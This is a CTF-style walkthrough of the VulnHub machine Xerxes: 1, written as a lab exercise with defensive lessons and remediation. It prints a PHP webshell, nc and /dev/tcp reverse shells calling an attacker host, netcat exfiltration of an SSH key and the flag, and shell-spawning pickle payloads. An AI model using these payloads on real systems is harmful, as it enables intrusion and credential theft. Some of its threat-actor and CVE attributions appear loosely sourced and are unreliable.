# Xerxes: 1 — This is Not Sparta, But the King's Defenses Are Just as Overconfident

Alright guys!! Xerxes: 1 is named after the Persian king who invaded Greece with overwhelming force but lost to disciplined methodology. The machine mirrors the theme: it throws layers of steganography, encoding, and obfuscation at you, but patient methodical enumeration defeats every defense. Multi-layer stego decoding unlocks a file upload, three-user lateral movement chain reveals credentials hidden in bash history and binary strings, and a Python pickle deserialization SUID binary gets you to elevated groups before a timestamp-derived sudo password hands you root. Wild machine. Absolute unit of a challenge. Goated for anyone serious about multi-stage exploitation.

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | Xerxes: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/xerxes-1,58/ |
| **Techniques** | Nmap, directory brute-force, QR code decode, steganography (alpha channel pixel extraction), multi-layer encoding (Base64/decimal/ASCII/Brainfuck), file upload extension bypass (.pht), PHP webshell, reverse shell, bash history credential harvesting, SUID binary enumeration, Python pickle deserialization RCE, SSH key reuse, timestamp-derived password cracking |
| **CVEs** | CWE-434 (file upload extension bypass), CWE-502 (insecure Python pickle deserialization), CWE-522 (credentials in bash history), CWE-321 (timestamp-derived password), CWE-312 (SSH private key exposure in shared directory) |
| **APT Groups** | APT28 — uses multi-layer steganography for C2 communication and exfiltration; Lazarus Group — employs pickle deserialization attacks against Python-based internal tools; multiple APT groups harvest bash history as the primary post-exploitation credential source |

---

## Attack Summary

```
nmap → HTTP 80
  → dirb → /dev (forgot password page + QR code)
  → zbarimg → Base64 decode → hint: "look deeper"
  → GIMP: alpha channel decompose → decimal sequence → chr() → ASCII string
  → Base64 decode → Brainfuck code → run online → password: VonBraun
  → /dev upload form (password: VonBraun) → shell.pht bypass → webshell
  → shell.pht?cmd=nc → reverse shell (www-data)
  → cat /home/amanpour/.bash_history → steqr.py -f newpassword → amanpour creds
  → ssh amanpour → amanpour in curtiz group
  → /home/curtiz/: notes + /bin/delacroix binary → strings → MD5 hash → crack → VonBraun
  → cp /home/curtiz/id_rsa → ssh -i id_rsa delacroix
  → find SUID → /opt/notes (pickle.load on user file)
  → malicious pickle payload → elevated shell
  → /home/delacroix/generate.sh → stat .last → creation time → md5sum → sudo password
  → sudo bash → root
  → /root/flag (PNG image file)
```

---

## Methodology

1. Full port scan and directory enumeration
2. QR code decoding on `/dev` forgot-password page
3. Alpha channel pixel extraction in GIMP
4. Multi-layer decode chain: decimal to ASCII to Base64 to Brainfuck
5. File upload bypass with `.pht` extension
6. Webshell to reverse shell
7. Bash history credential harvesting for lateral movement to `amanpour`
8. Group-based access: `amanpour` reads `curtiz` home directory
9. Crack MD5 hash from binary strings, obtain SSH key for `delacroix`
10. SUID binary: exploit Python pickle deserialization
11. Timestamp-derived sudo password: decode from file creation time
12. Root via sudo, retrieve flag PNG

---

## Step 1 — Reconnaissance and Directory Enumeration

```bash
sudo netdiscover
# Target: 192.168.1.TARGET

nmap -A 192.168.1.TARGET
# Port 80: HTTP only

dirb http://192.168.1.TARGET
```

`dirb` discovers `/dev/` — a password recovery page containing an embedded QR code image. This is the entry point to the entire steganography chain.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1083 — File and Directory Discovery

---

## Step 2 — QR Code Decode and Alpha Channel Steganography

### 2a. Download and decode the QR code

```bash
wget http://192.168.1.TARGET/dev/[qrcode_image]
zbarimg [qrcode_image].png
```

The QR code decodes to a Base64 string:

```bash
echo "[BASE64_FROM_QR]" | base64 -d
# Output: hint to look into the image alpha channel
```

### 2b. Extract alpha channel with GIMP

1. Open the QR code image in GIMP: **File → Open**
2. Add alpha channel: **Image → Flatten Image**, then **Image → Mode → RGB**
3. Decompose alpha: **Colors → Components → Decompose → Select "Alpha"**
4. Use the Color Picker tool on faint pixels in the upper-left corner of the decomposed alpha layer
5. Record the alpha values as decimal integers (e.g., 72, 101, 108, 108, 111...)

### 2c. Convert decimal sequence to ASCII

```bash
python3 -c "print(''.join([chr(x) for x in [72, 101, 108, 108, 111, ...]]))"
```

The ASCII output is another Base64 string.

### 2d. Base64 decode reveals Brainfuck

```bash
echo "[ASCII_TO_BASE64]" | base64 -d
# Output: +++++ +++[- >++++  +++++  <]>++  ... (Brainfuck)
```

Run the Brainfuck code at an online interpreter (https://copy.sh/brainfuck/ or `bf` command-line interpreter):

```bash
# Or: install and run locally
apt install beef
echo "[BRAINFUCK_CODE]" | bf
# Decoded password: VonBraun
```

**Password:** `VonBraun`

**Real-world note:** Multi-layer encoding chains (Base64 inside stego inside QR code inside Base64 inside Brainfuck) are used by advanced threat actors to hide C2 communication and exfiltrated data within image files. APT28 has been documented using steganographic techniques to conceal data in JPEG alpha channels during long-term persistence operations. The technique is called "steganographic channel layering."

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1027.003 — Steganography

---

## Step 3 — File Upload Bypass with .pht Extension

The `/dev` page presents a file upload form protected by the password `VonBraun`. Create a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

Save as `shell.pht`. The upload filter blocks `.php` but does not block `.pht`. Apache treats `.pht` as PHP and executes it:

```bash
curl "http://192.168.1.TARGET/dev/upload/shell.pht?cmd=id"
# Output: uid=33(www-data) gid=33(www-data)
```

**Extension bypass list for similar scenarios:**

```
.php .php3 .php4 .php5 .php7 .phtml .pht .phps .shtml
```

**Real-world note:** Extension-only upload validation is trivially bypassed. The correct validation requires checking MIME type, magic bytes (first 4–8 bytes of the file), and restricting execution permissions on the upload directory regardless of extension. Dozens of CVEs in popular CMS platforms stem from upload extension filter bypasses.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1105 — Ingress Tool Transfer

---

## Step 4 — Reverse Shell from Webshell

```bash
# Attacker: start listener
nc -lvnp 1234

# Trigger via webshell (URL-encoded nc reverse shell):
curl "http://192.168.1.TARGET/dev/upload/shell.pht?cmd=nc+-e+/bin/bash+192.168.1.ATTACKER+1234"
```

Alternatively, use a URL-encoded bash reverse shell:

```bash
# URL-encode: bash -i >& /dev/tcp/192.168.1.ATTACKER/1234 0>&1
curl "http://192.168.1.TARGET/dev/upload/shell.pht?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.1.ATTACKER/1234+0>%261'"
```

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then: stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 5 — Lateral Movement to amanpour via Bash History

Enumerate users and their home directories:

```bash
ls /home
# amanpour  curtiz  delacroix
cat /home/amanpour/.bash_history
```

The bash history contains:

```
python steqr.py -f newpassword
```

This exposes the argument `newpassword` as `amanpour`'s actual password (or reveals that `steqr.py` generated/set a password). Try SSH:

```bash
ssh amanpour@192.168.1.TARGET
# Password: newpassword
```

**Real-world note:** Bash history harvesting is the first post-exploitation step on any Linux host for experienced penetration testers and threat actors. OPSEC-conscious commands should be prefixed with a space (which prevents history recording if `HISTCONTROL=ignorespace` is set), or `HISTFILE=/dev/null` should be set before running sensitive commands.

**MITRE ATT&CK:** T1552.003 — Unsecured Credentials: Bash History

---

## Step 6 — Lateral Movement to delacroix via Group Access and SSH Key

Check `amanpour`'s group membership:

```bash
id
# uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(curtiz)
```

`amanpour` is in the `curtiz` group, granting read access to `/home/curtiz`:

```bash
ls -la /home/curtiz/
cat /home/curtiz/notes
strings /bin/delacroix
```

`strings` on the `/bin/delacroix` binary reveals an MD5 hash. Crack it:

```bash
echo "[MD5_HASH]" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
# Result: VonBraun
```

However, SSH with password may fail for `delacroix`. Use the SSH private key found in `/home/curtiz/`:

```bash
cp /home/curtiz/id_rsa /tmp/
chmod 600 /tmp/id_rsa
# Transfer to attacker:
nc 192.168.1.ATTACKER 5556 < /tmp/id_rsa   # target
nc -lvnp 5556 > delacroix_id_rsa            # attacker
chmod 600 delacroix_id_rsa

ssh -i delacroix_id_rsa delacroix@192.168.1.TARGET
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1552.004 — Unsecured Credentials: Private Keys

---

## Step 7 — SUID Binary: Python Pickle Deserialization RCE

As `delacroix`, enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
# /opt/notes (SUID binary)
```

Inspect the source:

```bash
cat /opt/notes.py
```

The binary calls `pickle.load()` on a file path supplied by the user. Python's `pickle` module is fundamentally unsafe when loading untrusted data: it can execute arbitrary code during deserialization.

Create a malicious pickle payload:

```bash
# Method 1: raw opcode pickle payload
cat > /tmp/evil_pickle << 'EOF'
cos
system
(S'/bin/sh'
tR.
EOF

/opt/notes
load ../../tmp/evil_pickle
```

**Method 2: Python-generated pickle:**

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

with open('/tmp/exploit.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

```bash
/opt/notes
load ../../tmp/exploit.pkl
```

The SUID binary executes as a user with elevated group permissions. Check what access this provides before proceeding to the final escalation.

**Real-world note:** Python pickle deserialization vulnerabilities have caused significant real-world incidents. CVE-2019-11248 (Kubernetes), multiple ML pipeline frameworks (MLflow, Hugging Face model loading), and countless internal Python tools have been exploited via malicious pickle payloads. NEVER deserialize pickle data from untrusted sources.

**MITRE ATT&CK:** T1203 — Exploitation for Client Execution; T1068 — Exploitation for Privilege Escalation

---

## Step 8 — Timestamp-Derived Sudo Password for Root

In `/home/delacroix/`, the `generate.sh` script reveals the sudo password derivation mechanism:

```bash
cat /home/delacroix/generate.sh
stat .last
# Look for Birth/Creation time, e.g.: 2014-03-08 00:19:51.000000000
```

The sudo password is the MD5 hash of the creation time:

```bash
CREATION_TIME="00:19:51"
echo -n "$CREATION_TIME" | md5sum
# 3f82... (this is the sudo password)
```

Use the derived password with sudo:

```bash
sudo bash
# Password: [MD5_OF_CREATION_TIME]
id
# uid=0(root) gid=0(root)
```

Retrieve the root flag (it's a PNG image):

```bash
file /root/flag
# PNG image data

# Transfer to attacker machine:
# On attacker:
nc -lvnp 5555 > flag.png
# On target:
nc 192.168.1.ATTACKER 5555 < /root/flag
```

Open `flag.png` on the attacker machine to see the final flag image.

(☞ﾟヮﾟ)☞ Root. This is Sparta! Actually, this is root. Same energy.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| Stego password | VonBraun | Alpha channel pixel chain → Brainfuck decode | Upload form password |
| amanpour password | newpassword | /home/amanpour/.bash_history | Exposed in command argument |
| curtiz MD5 hash | (from /bin/delacroix) | strings on binary | Cracks to: VonBraun |
| delacroix SSH key | (private key) | /home/curtiz/id_rsa | Group-based access |
| Sudo password | md5sum of .last creation time | generate.sh + stat | Timestamp-derived |
| Root flag | (PNG image) | /root/flag | Transfer via nc |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Multi-layer steganography hiding credentials in image alpha channel | APT28 uses steganographic channels in image files for C2 and exfiltration; this is a real operational technique | Monitor for unusual image file sizes/metadata; use steganalysis tools in threat hunting |
| 2 | File upload bypass with .pht extension | Extension-only filtering is trivially bypassed; dozens of CMS CVEs exploit this | Validate by MIME type AND magic bytes AND extension; disable PHP execution in upload dirs |
| 3 | Credentials in bash history | Bash history is the first thing attackers read post-compromise; sensitive commands left in history enable lateral movement | Use `HISTFILE=/dev/null` for sensitive sessions; clear history after credential operations |
| 4 | SSH private key stored in group-readable directory | Cross-user SSH key exposure enables lateral movement without password cracking | Set SSH key permissions to `600`; never store private keys in directories accessible to other users |
| 5 | Python pickle deserialization RCE | Pickle is a known insecure serialization format; numerous real-world exploits use pickle payloads | Replace pickle with JSON or MessagePack; never deserialize untrusted data |
| 6 | Timestamp-derived sudo password | Using predictable, deterministic system metadata to derive credentials is cryptographically broken | Generate sudo passwords with a CSPRNG; never derive credentials from observable system state |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Defense Evasion | Defense Evasion | Obfuscated Files: Steganography | T1027.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Unsecured Credentials: Bash History | T1552.003 |
| Credential Access | Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Fix file upload validation**: validate MIME type, magic bytes, AND extension; disable PHP execution in upload directories; store uploads outside web root
2. **Harden bash history**: set `HISTFILE=/dev/null` for privileged sessions; use `HISTCONTROL=ignorespace` to exclude sensitive commands; rotate credentials after any command-line credential exposure
3. **Secure SSH keys**: set permissions to `600` on all private keys; never store private keys in directories accessible to other users or groups
4. **Replace pickle with safe serialization**: use JSON, MessagePack, or protobuf; add input validation before any deserialization
5. **Generate cryptographically random credentials**: never derive passwords from predictable system state (timestamps, hostnames, file creation times)
6. **Remove SUID from custom Python scripts**: SUID on Python interpreters or scripts wrapping pickle is inherently dangerous

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SUID binaries; identify Python scripts with SUID |
| Protect | Access Control | Fix SSH key permissions; restrict group-readable sensitive dirs |
| Protect | Data Security | Secure bash history; replace pickle with safe serialization |
| Detect | Anomalies and Events | Alert on SUID binary execution; monitor for stego tool usage |
| Respond | Response Planning | Rotate all credentials exposed in bash history or via stego chain |
| Recover | Recovery Planning | Rebuild if pickle RCE executed arbitrary code; audit lateral movement path |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Fix group-readable SSH key directory; restrict SUID binary access |
| AC-6 | Least Privilege | Remove SUID from Python scripts; restrict sudo |
| IA-5 | Authenticator Management | Use CSPRNG for credentials; never derive from predictable system state |
| CM-7 | Least Functionality | Disable PHP execution in upload dirs; remove SUID from non-essential binaries |
| SA-11 | Developer Testing | Add unsafe deserialization check to code review checklist; SAST for pickle usage |

### CISA KEV

The Python pickle deserialization pattern maps to CWE-502 findings documented in multiple CISA advisories. File upload extension bypasses are covered in CISA advisory AA21-008A on web shell deployment techniques.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileged Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SA) | Monitor Logs and Events | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (file upload restrictions; pickle replacement)
- **D3-OAM** — Operating System Administrative Management (SUID auditing; bash history hygiene)
- **D3-DNAA** — Data Node Access Analysis (steganalysis for exfiltration detection)

---

## Final Thoughts

Xerxes: 1 is one of the most creative CTF machines on VulnHub. The steganography chain is genuinely advanced: alpha channel pixel extraction, decimal-to-ASCII, Base64, Brainfuck. The three-user lateral movement chain is methodical and teaches the discipline of reading everything, not just running automated tools. The pickle deserialization and timestamp-derived password are both clever, real-world-relevant techniques.

The Persian king Xerxes was undone not by lack of resources, but by underestimating the methodical defender. This machine teaches the inverse: methodical enumeration defeats every layer of obfuscation, no matter how creative.

Thanks guys!! (❍ᴥ❍ʋ)
